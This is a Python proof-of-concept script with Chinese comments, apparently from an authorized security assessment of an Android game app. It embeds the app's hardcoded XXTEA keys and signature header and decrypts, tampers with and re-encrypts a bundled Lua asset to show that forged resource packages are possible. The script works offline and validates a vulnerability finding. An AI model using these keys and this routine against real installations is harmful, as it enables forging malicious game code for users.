#!/usr/bin/env python3
# 授权环境专用最小验证模板（Phase 5）。默认不发送任何网络请求；涉及设备的操作仅限授权的本地测试设备。
"""VULN-007 最小验证：资源三层加密密钥全部硬编码 → 可解密/篡改/重加密（纯离线闭环）。

验证目标：用 Phase 3 还原的硬编码 XXTEA 密钥，对 APK 内置真实 luac 资产完成
"解密 → 篡改 → 重加密 → 再解密还原" 完整闭环，证明攻击者可制作与原版格式完全
一致的恶意资源包（投递环节属 VULN-008 通道问题，在线部分 blocked）。

密钥材料（Phase 3 CRYPTO-001/003/004，so 内硬编码实测）：
  luac XXTEA key = ASCII '03f1fdcbf5215b45fc790aaf3b965837' 前 16 字节
  签名头 = 'devaguopeifei'（13 字节）
  res.rpk 密钥源 XXTEA key(hex) = f84c7b745c8c00ede9d6add6a605cf63（hdq 容器层）

解密实现直接复用仓库已有工具 tools/decrypt_luac.py（Phase 2/3 验证过的参考实现）；
重加密为与其互逆的 XXTEA 标准加密（本脚本内实现，并用 tools 的 decrypt 做正确性裁决）。

用法：
  python3 validate_request.py                # 默认取 assets-apk 真实 luac 资产
  python3 validate_request.py --asset <path> # 指定其他 .luac
"""
import argparse
import importlib.util
import os
import struct
import sys

# 本目录位于 <repo>/浙江游戏大厅/traffic-analysis/step5/pocs/VULN-007
AN_DIR = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                       '..', '..', '..', '..'))          # 浙江游戏大厅/
REPO_ROOT = os.path.dirname(AN_DIR)                                       # 仓库根
TOOL = os.path.join(AN_DIR, 'tools', 'decrypt_luac.py')
DEFAULT_ASSET = os.path.join(AN_DIR, 'assets-apk', 'assets', 'src',
                             'app', 'GtInit.luac')

LUAC_KEY = b'03f1fdcbf5215b45fc790aaf3b965837'[:16]
SIGN = b'devaguopeifei'
DELTA = 0x9E3779B9
U32 = 0xFFFFFFFF


def load_tool():
    spec = importlib.util.spec_from_file_location('decrypt_luac', TOOL)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def xxtea_encrypt_block(v, k):
    """与 tools/decrypt_luac.py xxtea_decrypt_block 互逆的标准 XXTEA 加密。"""
    n = len(v)
    if n < 2:
        return v
    rounds = 6 + 52 // n
    s = 0
    z = v[n - 1]
    for _ in range(rounds):
        s = (s + DELTA) & U32
        e = (s >> 2) & 3
        for p in range(n - 1):
            y = v[p + 1]
            mx = ((((z >> 5) ^ ((y << 2) & U32)) + ((y >> 3) ^ ((z << 4) & U32))) & U32) ^ \
                 (((s ^ y) + (k[(p & 3) ^ e] ^ z)) & U32)
            v[p] = (v[p] + mx) & U32
            z = v[p]
        y = v[0]
        mx = ((((z >> 5) ^ ((y << 2) & U32)) + ((y >> 3) ^ ((z << 4) & U32))) & U32) ^ \
             (((s ^ y) + (k[((n - 1) & 3) ^ e] ^ z)) & U32)
        v[n - 1] = (v[n - 1] + mx) & U32
        z = v[n - 1]
    return v


def encrypt(plain: bytes, key: bytes, sign: bytes = b'', with_len=True) -> bytes:
    body = struct.pack('<I', len(plain)) + plain if with_len else plain
    pad = (-len(body)) % 4
    v = list(struct.unpack('<%dI' % ((len(body) + pad) // 4), body + b'\x00' * pad))
    k = list(struct.unpack('<4I', (key + b'\x00' * 16)[:16]))
    out = struct.pack('<%dI' % len(v), *xxtea_encrypt_block(v, k))
    return sign + out


def main():
    ap = argparse.ArgumentParser(description='VULN-007 资源加密离线闭环验证（不发送任何网络请求）')
    ap.add_argument('--asset', default=DEFAULT_ASSET, help='APK 内置 .luac 资产路径')
    ap.add_argument('--out-dir', default='', help='可选：把篡改版重加密产物写到该目录')
    args = ap.parse_args()

    if not os.path.exists(TOOL):
        print('FATAL: 未找到仓库工具 %s' % TOOL); return 2
    if not os.path.exists(args.asset):
        print('FATAL: 资产不存在: %s' % args.asset); return 2
    tool = load_tool()

    raw = open(args.asset, 'rb').read()
    r1 = {'asset': os.path.relpath(args.asset, REPO_ROOT), 'size': len(raw),
          'has_devaguopeifei_sign': raw.startswith(SIGN)}

    # 1) 解密真实资产（仓库参考实现；APK luac 实测为"无长度前缀"变体，热更内层同）
    src = tool.decrypt(raw, LUAC_KEY, strip_sign=SIGN, with_len=True)
    with_len = True
    if not src:
        src = tool.decrypt(raw, LUAC_KEY, strip_sign=SIGN, with_len=False)
        with_len = False
    r1['variant'] = 'with_len_prefix' if with_len else 'no_len_prefix'
    r1['decrypt_ok'] = bool(src) and (src[:2] == b'--' or src[:4] == b'\x1bLua'
                                      or b'function' in src[:4096] or b'local' in src[:4096])
    r1['plaintext_prefix'] = src[:80].decode('utf-8', errors='replace')

    # 2) 篡改：注入一行标记
    tampered = b'-- POC-TAMPER-MARKER (authorized offline validation)\n' + src

    # 3) 重加密为与原版同格式（sign + XXTEA，长度前缀随原变体）
    forged = encrypt(tampered, LUAC_KEY, sign=SIGN, with_len=with_len)

    # 4) 用仓库参考实现再解密篡改版 → 必须还原出篡改后明文
    back = tool.decrypt(forged, LUAC_KEY, strip_sign=SIGN, with_len=with_len)
    if with_len:
        roundtrip_ok = (back == tampered)
    else:
        # 无长度前缀变体：回读含 4 字节对齐零填充，按"前缀一致 + 尾部全零"判定
        roundtrip_ok = (back[:len(tampered)] == tampered
                        and back[len(tampered):] == b'\x00' * (len(back) - len(tampered)))

    if args.out_dir:
        os.makedirs(args.out_dir, exist_ok=True)
        p = os.path.join(args.out_dir, os.path.basename(args.asset))
        open(p, 'wb').write(forged)
        print('篡改重加密产物写入 %s' % p)

    print('1. 原资产解密: %s (%s, %dB)' % ('OK' if r1['decrypt_ok'] else 'FAIL',
          r1['asset'], r1['size']))
    print('   明文前缀: %r' % r1['plaintext_prefix'])
    print('2. 篡改+重加密+再解密闭环: %s' % ('OK —— 伪造包与原版格式自洽' if roundtrip_ok else 'FAIL'))
    ok = r1['decrypt_ok'] and roundtrip_ok
    print('VERDICT: %s' % ('PASS' if ok else 'FAIL'))
    return 0 if ok else 1


if __name__ == '__main__':
    sys.exit(main())
